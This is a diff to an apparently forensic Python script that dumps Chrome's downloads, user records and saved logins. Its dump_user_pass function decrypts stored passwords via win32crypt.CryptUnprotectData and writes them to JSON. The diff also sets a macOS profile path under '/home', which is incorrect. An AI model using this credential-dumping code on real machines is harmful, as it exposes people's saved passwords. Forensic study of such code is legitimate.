@@ -7,7 +7,6 @@ from pandas import read_sql_query
 from re import findall
 import psutil
 from difflib import SequenceMatcher
-import win32crypt
 import json
 import platform
 import time
@@ -38,8 +37,9 @@ def investigate_dbs(terminate_chrome, deep):
     chrome_dbs_path = get_dbs_path()
     log.info('DUMP DOWNLOADS')
     dump_downloads(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_downloads.json'))
-    log.info('DUMP USER PASS')
-    dump_user_pass(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_user_pass.json'))
+    if 'C:\\' in chrome_dbs_path:
+        log.info('DUMP USER PASS')
+        dump_user_pass(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_user_pass.json'))
     log.info('DUMP USERS')
     dump_users(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_users.json'))
 
@@ -77,6 +77,7 @@ def dump_user_pass(path, output):
         cursor.execute(
             'SELECT username_value, action_url, times_used, signon_realm, origin_url, password_element, password_value, date_created FROM logins')
         for result in cursor.fetchall():
+            import win32crypt
             password = win32crypt.CryptUnprotectData(result[6], None, None, None, 0)[1]
             if password:
                 result = list(result)
@@ -142,8 +143,8 @@ def get_dbs_path():
     path_win_10_post2008 = os.path.join('C:\\', 'Users', os.getenv('username'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
     path_win_7 = os.path.join('C:\\', 'Users', os.getenv('username'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
     path_win_xp = os.path.join('C:\\', 'Documents and Settings', os.getenv('username'), 'Application Support', 'Google', 'Chrome', 'Default')
-    path_mac_os_x = '~/Library/Application Support/Google/Chrome/Default/'
-    path_linux = '~/.config/google-chrome/Default/'
+    path_mac_os_x = os.path.join('/home', os.getenv('USER'), 'Library', 'Application Support', 'Google', 'Chrome', 'Default')
+    path_linux = os.path.join('/home', os.getenv('USER'), '.config', 'google-chrome', 'Default')
     system_name = platform.system().upper()
     if 'JAVA' in system_name:
         return None
@@ -194,5 +195,4 @@ if __name__ == '__main__':
     parser.add_argument('-d', '--deep', help='deep inspection', required=False, dest='deep',
                         action='store_true')
 
-    
     investigate_dbs(**vars(parser.parse_args()))
